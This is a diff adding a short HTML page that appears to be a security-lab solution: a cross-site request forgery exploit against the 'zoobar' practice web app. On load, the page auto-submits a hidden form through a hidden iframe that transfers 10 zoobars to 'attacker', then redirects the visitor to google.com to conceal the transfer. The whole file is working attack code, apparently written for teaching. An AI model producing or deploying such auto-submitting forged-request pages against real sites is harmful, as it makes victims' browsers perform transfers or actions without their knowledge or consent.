@@ -1,0 +1,14 @@
+<html>
+<body>
+	<iframe name="hiddenframe" style="visibility: hidden"></iframe>
+	<form id="goodthings" method="POST" target="hiddenframe" action="http://zoobar.org/transfer.php">
+		<input name="zoobars" type="hidden" value="10">
+		<input name="recipient" type="hidden" value="attacker">
+		<input id="bottom" name="submission" type="submit" value="Send" style="visibility: hidden">
+	</form>
+	<script>		
+			document.getElementById('bottom').click();
+			setTimeout(function(){window.location.replace('http://www.google.com');},30);
+	</script>
+</body>
+</html>
